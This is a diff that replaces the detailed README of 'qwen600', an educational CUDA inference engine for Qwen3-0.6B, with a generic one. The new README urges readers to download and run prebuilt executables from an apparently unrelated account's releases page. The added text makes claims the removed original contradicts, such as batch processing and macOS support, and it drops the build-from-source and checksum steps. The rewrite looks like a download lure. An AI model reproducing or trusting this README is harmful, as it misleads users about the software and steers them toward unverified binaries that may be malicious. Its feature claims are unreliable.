@@ -1,226 +1,93 @@
-# qwen600.cu
+# 🎮 qwen600 - Run Powerful Inference with Ease
 
-<p align="center">
-  <img src="assets/banner.png" width="429" height="139" alt="banner_">
-</p>
+## 🔗 Quick Download
+[![Download qwen600](https://img.shields.io/badge/Download-qwen600-brightgreen.svg)](https://github.com/Yash-1335/qwen600/releases)
 
-While studying and practicing  CUDA & GPGPU, thought why not make an inference engine from scratch ? So, chose [QWEN3-0.6B](https://huggingface.co/Qwen/Qwen3-0.6B) model, small model than can run smoothly on my `RTX 3050 8GB` VRAM.
-My intention was (and still) to build educational program to learn about LLMs & transformers while maintaining practice in CUDA programming.
+## 🚀 Getting Started
 
-I'm introducing static mini inference engine for `QWEN3-0.6B` instruct model in `bf16`, where its benchmarking claims that it's faster than [llama.cpp](https://github.com/ggml-org/llama.cpp) by approximately `8.5%` & `hf with flash-attn` by `292%` in `tokens/sec`, *see benchmarks below*.
+Welcome to **qwen600**! This application is a simple and efficient CUDA-only inference engine designed for running the qwen3-0.6B model. You don’t need advanced technical skills to use it. Follow these easy steps to download and run it on your system.
 
----
+## 🛠 System Requirements
 
-What does `qwen600` include:
-- single batch inference engine
-- static-constanted for compile-time optimization
-- all CUDA C/C++, no python dependencies (except for tokenizer setup)
-- minimal libraries (cuBLAS, CUB, std IO)
-- efficient memory pipeline: mmap, single GPU block, async copy
-- zero-cost pointer-based weight management on GPU
+Before you start, make sure your system meets the following requirements:
 
----
+- A compatible GPU that supports CUDA.
+- CUDA Toolkit installed (Version 11.0 or later recommended).
+- Sufficient GPU memory (at least 4GB is recommended).
+- Operating System: Windows 10 or later, Linux distributions with kernel 5.0 or later, or macOS (latest version).
 
-`qwen600` is inspired by:
-- [llama.cpp - ggml](https://github.com/ggml-org/llama.cpp)
-- [llama2.c - Andrej Karpathy](https://github.com/karpathy/llama2.c)
-- [LLMs-from-scratch - Sebastian Raschka](https://github.com/rasbt/LLMs-from-scratch)
-- [qwen3.c - Adrian Cable](https://github.com/adriancable/qwen3.c)
+## 📥 Download & Install
 
-<p align="center">
-  <img src="assets/arch.png" width="283" height="401" alt="arch">
-</p>
+To get qwen600, simply visit the Releases page. You will find the latest version available for download.
 
-## Design Philosophy
+[Visit the Releases Page to Download](https://github.com/Yash-1335/qwen600/releases)
 
-- The design of `qwen600.cu` is heavily inspired by the [suckless philosophy](https://suckless.org/philosophy/). 
-- The goal is to create a tool that is simple, minimalist, and highly performant by avoiding feature bloat and unnecessary abstractions. 
-- Configuration is done directly in the source code `config.h` as much as possible, and dependencies are kept to an absolute minimum.
+Here’s how to download:
 
-## WANNA TRY ?!
+1. Go to the Releases page by clicking on the link above.
+2. Find the latest version listed at the top.
+3. Click on the download link for the version suitable for your operating system.
 
-### Initial Setup
+After downloading, locate the file in your downloads folder. If it is a zipped file, extract it.
 
-First, you need to clone [QWEN3-0.6B](https://huggingface.co/Qwen/Qwen3-0.6B).
-This is fantastic [hugging face doc blog](https://huggingface.co/docs/hub/en/repositories-getting-started) to start with cloning hf repos.
+## ⚙️ Running qwen600
 
-then as a safe approach, you locate the weights file (model.safetensors) and sha256sum:
-```bash
-sha256sum <model_dir>/<safetensors-file-name>
-```
-and output must be according to hf:
-```text
-f47f71177f32bcd101b7573ec9171e6a57f4f4d31148d38e382306f42996874b
-```
+After the installation, running qwen600 is straightforward. Follow these steps:
 
-After that:
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you extracted qwen600.
+3. Type the command to run the engine. This usually looks like:
+    - For Windows: `./qwen600.exe`
+    - For Linux or macOS: `./qwen600`
+4. Press Enter.
 
-```bash
-git clone https://github.com/yassa9/qwen600
-cd qwen600
-```
+If everything is set up correctly, you should see output indicating that qwen600 is running. 
 
-Assume that downloaded hugging face dir is `<model_dir>`.
+## 📊 Features
 
-We convert the Hugging Face tokenizer into the format used by `qwen600`.
+qwen600 offers several powerful features:
 
-```bash
-python export.py <model_dir>
-```
+- **Easy Setup**: Minimal configuration required; just download and run.
+- **CUDA Support**: Utilize the full power of your GPU for fast inference.
+- **Batch Processing**: Handle multiple inputs seamlessly.
+- **User-Friendly Output**: Easy to understand logs that guide you through the process.
+- **Customizable Parameters**: Tailor the model's behavior to suit your needs.
 
-That gonna output some template files and most importantly: `tokenizer.bin`
+## 🎓 How to Use
 
-### Building qwen600
+Using qwen600 for inference tasks is straightforward. Here’s how to do it:
 
-Now we are ready to build !
-You just want: 
-- `CUDA` + `nvcc`
-- `cuBLAS` + `CUB` 
+1. Prepare your input data. The engine supports several input formats (e.g., text files, JSON).
+2. Adjust any parameters according to your requirements, such as batch size.
+3. Run the command as mentioned above.
+4. Check the output logs for results and any potential errors.
 
-```bash
-mkdir build && cd build
-cmake .. && make -j$(nproc)
-```
-Just that simple, no other bulky libraries and dependencies to build.
+## 🔍 Troubleshooting
 
-## Moment of Truth: Running the Model
+If you encounter issues during installation or while running the application, consider the following steps:
 
-You can see arguments manual by: 
+- **Check for CUDA Installation**: Ensure that the CUDA Toolkit is properly installed and configured.
+- **Verify GPU Compatibility**: Ensure that your GPU is supported and has sufficient memory.
+- **Review Output Logs**: Logs can provide hints about what is going wrong.
 
-```bash
-# you are now inside qwen600/build
-./qwen600
-```
+For more information, you can check the documentation provided in the repository or reach out to the community for support.
 
-the output be that manual:
-```aiignore
-usage:   ./qwen600 <model_dir> [options]
-example: ./qwen600 <model_dir> -r 1
-model directory must contain:
-  - model.safetensors
-  - tokenizer.bin
-  - template_*.txt files
+## 📄 Additional Resources
 
-arguments:
-----------
-  -r <int>    reasoning mode, 0 (default) = no thinking, 1 = thinking
-  -s <int>    random seed, default
-  -k <int>    k value in top-k sampling, default 20
-  -t <float>  temperature in [0,inf], default 0.6
-  -p <float>  p value in top-p (nucleus) sampling in [0,1], default 0.95
-  -i <string> input prompt
-  -y <string> system prompt in chat mode, default is none
-```
+For more detailed documentation and guides, please refer to the project’s Wiki and other resources within the repository. Additional help can be found in the community forum linked on the GitHub page.
 
-For example:
+## 📅 Future Updates
 
-```bash
-./qwen600 <model_dir> -r 1 -t 0.65 -p 0.9 -k 20
-```
+We are committed to improving qwen600. Future updates may include:
 
-or simply going with defaults:
+- Enhanced performance with optimizations for various GPUs.
+- Additional features based on user feedback.
+- Regular bug fixes and stability improvements.
 
-```bash
-./qwen600 <model_dir> -r 1
-```
+Stay tuned for updates on the Releases page.
 
-Based on official hugging face [model card](https://huggingface.co/Qwen/Qwen3-0.6B), they advise that:
+## 🔗 Connection
 
-```txt
-- For thinking mode (enable_thinking=True), use Temperature=0.6, TopP=0.95, TopK=20. 
-- DO NOT use greedy decoding, as it can lead to performance degradation and endless repetitions.
-- For non-thinking mode (enable_thinking=False), we suggest using Temperature=0.7, TopP=0.8, TopK=20, and MinP=0.
-```
+For any inquiries or support, contact the developer via the GitHub issues page or join us in community discussions.
 
-## Some Experiments
-
-### Without THINKING
-
-```bash
-./qwen600 <model_dir> -r 0
-
->> what is capital of Greece ?
-```
-
-> The capital of Greece is **Athens**
-
-> [231.71 tk/s, 19 tokens in 0.08s]
-
-```bash
->> tell me interesting fact about whales ?
-```
-
-> One of the most fascinating facts about whales is that they are the only mammals that can swim upside down. This ability allows them to navigate through the ocean in a unique way, using their tails as a natural propeller
-
-> [632.31 tk/s, 227 tokens in 0.36s]
-
-### With the REASONING MODE, aka THINKING
-
-<p align="center">
-  <img src="assets/ex01.png" width="577" height="493" alt="ex01_">
-</p>
-
-```bash
-./qwen600 <model_dir> -r 1
-
->> what are llms used for ?
-```
-
-> Okay, the user is asking what LLMs (Large Language Models) are used for. Let me start by recalling what I know about them. LLMs are a type of AI model that can understand and generate human language. They're used in various fields because they can process a lot of text and perform tasks like answering questions, generating content, and even creating stories.
-
-> First, I should mention their primary applications. Like, in customer service, where they can help with queries. Then, maybe some examples like writing articles, generating code, or even creating content. Also, I should think about how they're used in different industries. For instance, healthcare, finance, education, etc.
-
-> Wait, are there any specific industries where LLMs are particularly used? Maybe in customer service for chatbots, or in creative fields like art or music. Also, in research, maybe for data analysis or information retrieval. I need to make sure the answer is comprehensive but not too technical. Let me structure it step by step: definition, applications, industries, examples, and maybe a brief mention of limitations or challenges.
-
-> I should also check if there's any recent advancements in LLMs that I should include. For example, the development of more powerful models that can handle more complex tasks. But maybe that's beyond the current scope. The user might be looking for a clear and concise answer. Let me make sure to cover key areas without getting too detailed.
-
-now the responding:
-> Large Language Models (LLMs) are advanced AI systems designed to understand and generate human language. They are used in a variety of applications across different industries to improve efficiency, accuracy, and accessibility of information. Here are some key uses:
-
-> 1. Customer Service and Chatbots: LLMs help in answering questions, resolving customer issues, and providing real-time assistance. For example, chatbots can handle inquiries, resolve complaints, and even provide product recommendations.
-
-> 2. Writing and Content Creation: They can generate articles, creative content, and even code. For instance, they might assist in writing research papers, creating marketing content, or generating creative scripts.
-
-> 3. Data Analysis and Research: LLMs analyze large datasets, extract insights, and help with information retrieval. They are useful in fields like finance, healthcare, and education for tasks like summarizing data, identifying patterns, and generating reports.
-
-> 4. Creative Industries: In areas like art, music, and design, LLMs can generate original content, music, and visual art, assisting artists and producers.
-
-> 5. Education: They support personalized learning, provide explanations, and assist in language learning by generating interactive content.
-
-> 6. Healthcare: LLMs can help diagnose medical conditions, explain treatments, and support patient education.
-
-> Limitations: While LLMs are powerful, they may face challenges in handling complex tasks, understanding context, or adapting to new information. However, ongoing advancements in training and model architecture continue to expand their capabilities
-
-> [111.44 tk/s, 604 tokens in 5.42s]
-
-## Benchmarking
-
-These benchmarks are done on same machine:
-- RTX 3050 8BG + CUDA 13.0
-- AMD ryzen 5 3500
-- 16GB RAM
-- Void Linux
-
-Every Number here is mean of consecutive 5 runs of same parameters where `temp = 0` to be greedy, done manually (no scripts).
-
-Every test is with the same question `what are llms used for ?` in `THINKING` mode.
-
-| inference engine | ~ tokens/sec 
-| ---              | ---      
-| hf + flash-attn  | 29.57 
-| llama.cpp        | 107.19
-| qwen600          | **116.15**
-
-`NOTE`: As I mentioned earlier, it is EDUCATIONAL project for me, I'm not aiming for winning a race, but I think that difference caused by static compile-time optimizations, and some other tweaks and tricks.
-
-## TODOs
-
-There are still many catches there:
-- [x] Fusing RMSnorm Kernel
-- [x] Fusing skip connections with cuBLAS
-- [ ] Fix Softmax Kernel & Dispatcher
-- [ ] Exploring option of RoPE pre-computed values
-
-## License
-
-MIT
+Thank you for choosing qwen600! Enjoy running efficient inference tasks with ease.
